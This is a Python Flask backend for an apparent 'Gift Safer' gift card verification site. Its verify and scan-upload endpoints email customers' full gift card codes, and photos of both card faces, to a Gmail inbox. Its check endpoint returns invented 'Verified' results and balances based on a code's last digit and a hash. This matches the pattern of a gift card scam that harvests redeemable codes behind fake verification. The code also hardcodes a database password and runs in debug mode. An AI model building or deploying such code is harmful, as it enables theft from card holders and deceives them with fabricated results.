from flask import Flask, render_template, request, jsonify
import os
import time
import uuid
import hashlib
import base64
import smtplib
import ssl
from email.message import EmailMessage
from datetime import datetime, timezone
import psycopg
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

# ---------------- PostgreSQL Config ----------------
DATABASE_URL = os.getenv("DATABASE_URL", "postgresql://postgres:joetel88@localhost:5432/Gift_card_verifier")
GMAIL_USER = os.getenv("GMAIL_USER", "giftsafer@gmail.com")
GMAIL_APP_PASSWORD = os.getenv("GMAIL_APP_PASSWORD", "")
CONTACT_EMAIL = os.getenv("CONTACT_EMAIL", "giftsafer@gmail.com")

# ---- Simple in-memory rate limiter (per IP) ----
WINDOW_SECONDS = 30
MAX_REQUESTS = 10
_ip_hits = {}  #ip -> list[timestamps]


def now_iso():
    return datetime.now(timezone.utc).isoformat(timespec="seconds")


def get_db():
    """
    Creates a new DB connection per call.
    For small apps this is fine. For bigger apps, consider a pool.
    """
    # Fail fast on unreachable DB to avoid Gunicorn worker timeouts.
    return psycopg.connect(DATABASE_URL, connect_timeout=5)


def init_db():
    conn = get_db()
    cur = conn.cursor()

    # used_codes table
    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS used_codes (
            id SERIAL PRIMARY KEY,
            card_type TEXT NOT NULL,
            code TEXT NOT NULL UNIQUE,
            used_at TEXT NOT NULL,
            reference TEXT NOT NULL
        );
        """
    )

    # check_logs table
    cur.execute(
        """
        CREATE TABLE IF NOT EXISTS check_logs (
            id SERIAL PRIMARY KEY,
            ip TEXT NOT NULL,
            card_type TEXT NOT NULL,
            code_masked TEXT NOT NULL,
            status TEXT NOT NULL,
            checked_at TEXT NOT NULL,
            reference TEXT NOT NULL
        );
        """
    )

    conn.commit()
    cur.close()
    conn.close()


def rate_limited(ip: str) -> bool:
    t = time.time()
    hits = _ip_hits.get(ip, [])
    hits = [h for h in hits if (t - h) <= WINDOW_SECONDS]
    if len(hits) >= MAX_REQUESTS:
        _ip_hits[ip] = hits
        return True
    hits.append(t)
    _ip_hits[ip] = hits
    return False


def mask_code(code: str) -> str:
    code = (code or "").strip()
    if len(code) <= 4:
        return "*" * len(code)
    return "*" * (len(code) - 4) + code[-4:]


def matches_demo_format(card_type: str, code: str) -> bool:
    import re
    code = (code or "").strip()

    if card_type == "DemoCard":
        return re.fullmatch(r"DEMO-(\d{4})-(\d{4})-(\d{4})", code) is not None

    if card_type == "SampleTunes":
        return re.fullmatch(r"ST-(\d{12})", code) is not None

    if card_type == "MockFlix":
        return re.fullmatch(r"MF-([A-Za-z0-9]{4})-([A-Za-z0-9]{4})", code) is not None

    return False


def stable_demo_balance(code: str) -> int:
    h = hashlib.sha256(code.encode("utf-8")).hexdigest()
    n = int(h[:6], 16)
    return 1000 + (n % 19001)


def demo_decision(card_type: str, code: str) -> str:
    code = code.strip()
    last = code[-1]
    if last in ("0", "5"):
        return "valid"
    return "invalid"


def is_used(code: str) -> bool:
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT 1 FROM used_codes WHERE code = %s LIMIT 1", (code,))
    row = cur.fetchone()
    cur.close()
    conn.close()
    return row is not None


def mark_used(card_type: str, code: str, reference: str):
    conn = get_db()
    cur = conn.cursor()
    cur.execute(
        """
        INSERT INTO used_codes (card_type, code, used_at, reference)
        VALUES (%s, %s, %s, %s)
        ON CONFLICT (code) DO NOTHING;
        """,
        (card_type, code, now_iso(), reference),
    )
    conn.commit()
    cur.close()
    conn.close()


def log_check(ip: str, card_type: str, code: str, status: str, reference: str):
    conn = get_db()
    cur = conn.cursor()
    cur.execute(
        """
        INSERT INTO check_logs (ip, card_type, code_masked, status, checked_at, reference)
        VALUES (%s, %s, %s, %s, %s, %s);
        """,
        (ip, card_type, mask_code(code), status, now_iso(), reference),
    )
    conn.commit()
    cur.close()
    conn.close()

def send_email(subject: str, body: str, attachments=None):
    if not GMAIL_APP_PASSWORD:
        raise RuntimeError("Missing GMAIL_APP_PASSWORD env var.")

    msg = EmailMessage()
    msg["Subject"] = subject
    msg["From"] = GMAIL_USER
    msg["To"] = CONTACT_EMAIL
    msg.set_content(body)

    for attachment in attachments or []:
        msg.add_attachment(
            attachment["data"],
            maintype=attachment["maintype"],
            subtype=attachment["subtype"],
            filename=attachment["filename"],
        )

    context = ssl.create_default_context()
    try:
        # Keep SMTP connects short to avoid worker timeouts if DNS/network is slow.
        with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=context, timeout=15) as server:
            server.login(GMAIL_USER, GMAIL_APP_PASSWORD)
            server.send_message(msg)
    except Exception as exc:
        raise RuntimeError(f"Email send failed: {exc.__class__.__name__}") from exc


def parse_data_url(data_url: str):
    if not data_url.startswith("data:"):
        raise ValueError("Invalid data URL.")
    header, encoded = data_url.split(",", 1)
    mime = header.split(";")[0].replace("data:", "")
    if "/" not in mime:
        raise ValueError("Invalid mime type.")
    maintype, subtype = mime.split("/", 1)
    return maintype, subtype, base64.b64decode(encoded)


@app.route("/")
def index():
    return render_template("index.html")

@app.route("/admin")
def admin():
    return render_template("admin.html")

@app.route("/api/verify-request", methods=["POST"])
def api_verify_request():
    data = request.get_json(silent=True) or {}
    brand = (data.get("brand") or "").strip()
    code = (data.get("code") or "").strip()
    email = (data.get("email") or "").strip()

    if not brand or not code or not email:
        return jsonify({"ok": False, "message": "Missing brand, code, or email."}), 400

    subject = f"Gift Safer Verification Request - {brand}"
    body = (
        f"Verification request received.\n\n"
        f"Brand: {brand}\n"
        f"Code: {code}\n"
        f"Customer Email: {email}\n"
        f"Received At: {now_iso()}\n"
    )
    try:
        send_email(subject, body)
    except Exception as exc:
        app.logger.exception("Verify email failed")
        return jsonify({"ok": False, "message": str(exc)}), 502
    return jsonify({"ok": True})


@app.route("/api/scan-upload", methods=["POST"])
def api_scan_upload():
    data = request.get_json(silent=True) or {}
    brand = (data.get("brand") or "").strip()
    email = (data.get("email") or "").strip()
    front = data.get("front")
    back = data.get("back")
    mode = (data.get("mode") or "scan").strip()

    if not brand or not email or not front or not back:
        return jsonify({"ok": False, "message": "Missing brand, email, or images."}), 400

    try:
        maintype_f, subtype_f, bytes_f = parse_data_url(front)
        maintype_b, subtype_b, bytes_b = parse_data_url(back)
    except Exception as exc:
        return jsonify({"ok": False, "message": "Invalid image data."}), 400

    subject = f"Gift Safer {mode.capitalize()} Upload - {brand}"
    body = (
        f"Scan upload received.\n\n"
        f"Mode: {mode}\n"
        f"Brand: {brand}\n"
        f"Customer Email: {email}\n"
        f"Received At: {now_iso()}\n"
    )
    attachments = [
        {
            "filename": f"{brand.lower().replace(' ', '_')}_front.{subtype_f}",
            "data": bytes_f,
            "maintype": maintype_f,
            "subtype": subtype_f,
        },
        {
            "filename": f"{brand.lower().replace(' ', '_')}_back.{subtype_b}",
            "data": bytes_b,
            "maintype": maintype_b,
            "subtype": subtype_b,
        },
    ]
    try:
        send_email(subject, body, attachments=attachments)
    except Exception as exc:
        app.logger.exception("Scan upload email failed")
        return jsonify({"ok": False, "message": str(exc)}), 502
    return jsonify({"ok": True})


@app.route("/api/check", methods=["POST"])
def api_check():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr or "unknown")
    data = request.get_json(silent=True) or {}

    card_type = (data.get("card_type") or "").strip()
    code = (data.get("code") or "").strip().upper()

    reference = uuid.uuid4().hex[:10].upper()

    if rate_limited(ip):
        status = "rate_limited"
        log_check(ip, card_type, code, status, reference)
        return jsonify(
            {
                "ok": False,
                "status": status,
                "label": "Too many requests",
                "message": f"Rate limit: max {MAX_REQUESTS} checks per {WINDOW_SECONDS}s.",
                "reference": reference,
                "checked_at": now_iso(),
            }
        ), 429

    if card_type not in ("DemoCard", "SampleTunes", "MockFlix"):
        status = "invalid"
        log_check(ip, card_type, code, status, reference)
        return jsonify(
            {
                "ok": False,
                "status": status,
                "label": "Invalid",
                "message": "Choose a valid card type.",
                "reference": reference,
                "checked_at": now_iso(),
            }
        ), 400

    if not code:
        status = "invalid"
        log_check(ip, card_type, code, status, reference)
        return jsonify(
            {
                "ok": False,
                "status": status,
                "label": "Invalid",
                "message": "Enter a code.",
                "reference": reference,
                "checked_at": now_iso(),
            }
        ), 400

    if not matches_demo_format(card_type, code):
        status = "invalid"
        log_check(ip, card_type, code, status, reference)
        return jsonify(
            {
                "ok": True,
                "status": status,
                "label": "Invalid",
                "message": "Code format not recognized for this card type.",
                "reference": reference,
                "checked_at": now_iso(),
            }
        )

    if is_used(code):
        status = "used"
        log_check(ip, card_type, code, status, reference)
        return jsonify(
            {
                "ok": True,
                "status": status,
                "label": "Used",
                "message": "This code has already been checked and marked as used.",
                "reference": reference,
                "checked_at": now_iso(),
            }
        )


    status = demo_decision(card_type, code)

    if status == "valid":
        balance = stable_demo_balance(code)
        currency = "NGN"
        mark_used(card_type, code, reference)
        log_check(ip, card_type, code, status, reference)
        return jsonify(
            {
                "ok": True,
                "status": status,
                "label": "Verified",
                "message": "Verification completed.",
                "card_type": card_type,
                "balance": balance,
                "currency": currency,
                "reference": reference,
                "checked_at": now_iso(),
            }
        )

    log_check(ip, card_type, code, status, reference)
    return jsonify(
        {
            "ok": True,
            "status": status,
            "label": "Invalid",
            "message": "Not recognized by rules.",
            "reference": reference,
            "checked_at": now_iso(),
        }
    )


if __name__ == "__main__":
    init_db()
    app.run(debug=True)
